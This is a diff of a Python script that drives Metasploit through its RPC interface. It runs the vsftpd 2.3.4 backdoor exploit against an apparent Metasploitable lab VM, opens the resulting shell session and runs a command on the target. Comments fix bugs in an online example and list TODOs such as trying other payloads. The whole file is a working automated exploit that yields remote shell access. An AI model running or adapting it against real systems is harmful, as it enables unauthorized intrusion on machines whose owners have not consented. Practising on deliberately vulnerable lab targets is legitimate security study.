@@ -1,18 +1,27 @@
 '''
 based on ...
 https://github.com/allfro/pymetasploit
-
+2 issues with that page
+    RHOST should be RHOSTS
+    the session passed to the shell should be '1' and not 1 (no qoutes)
+TODO
+start rpc w/ random password
+refine session id (dict)
+check out multiple payloads (search options, etc.)
+argparse
 '''
 
 from pymetasploit3.msfrpc import *
+import time
 
-# help(MsfRpcClient)
-metasploitableIP = '192.168.56.104'
-
-# started with this:
+# start MSFRPC with this:
 # msfrpcd -P password123
 
+# help(MsfRpcClient)    # print all options
+metasploitableIP = '192.168.56.105'
+# define the exploit
 tgtExploit = 'unix/ftp/vsftpd_234_backdoor'
+# setup the client
 client = MsfRpcClient('password123', ssl=True)
 
 '''
@@ -26,7 +35,8 @@ MsfRpcClient is segmented into different management modules
     plugins: manages the plugins associated with the Metasploit core.
     sessions: manages the interaction with Metasploit meterpreter sessions.
 '''
-print([m for m in dir(client) if not m.startswith('_')])
+# prints a lot if info
+# print([m for m in dir(client) if not m.startswith('_')])
 
 # list of all the available modules, it's a lot
 # print(client.modules.exploits)
@@ -42,24 +52,33 @@ print(client.modules.post)
 # set exploit
 exploit = client.modules.use('exploit', tgtExploit)
 # print details
+'''
 print(exploit.description)
 print(exploit.authors)
-print(exploit.options)
 print(exploit.required)
+'''
+# show the options
+# print(exploit.options)
 
 # list payloads
-print(exploit.payloads)
+print('Payloads: ' + str(exploit.payloads))
 # specify target:
-exploit['RHOSTS'] = tgtExploit
-# set verbose option to true
+exploit['RHOSTS'] = metasploitableIP
+# set verbose option to true, not sure what this does
 exploit['VERBOSE'] = True
 
 # execute it
 exploit.execute(payload='cmd/unix/interact')
+
+# delay to give it time to establish the connection
+for i in range(3, 0, -1):
+    print('delay for {}0 seconds'.format(i))
+    time.sleep(10)
+
 # list session
 print(client.sessions.list)
-'''
-shell = client.sessions.session(1)
+
+# test it
+shell = client.sessions.session('1')
 shell.write('whoami\n')
 print(shell.read())
-'''
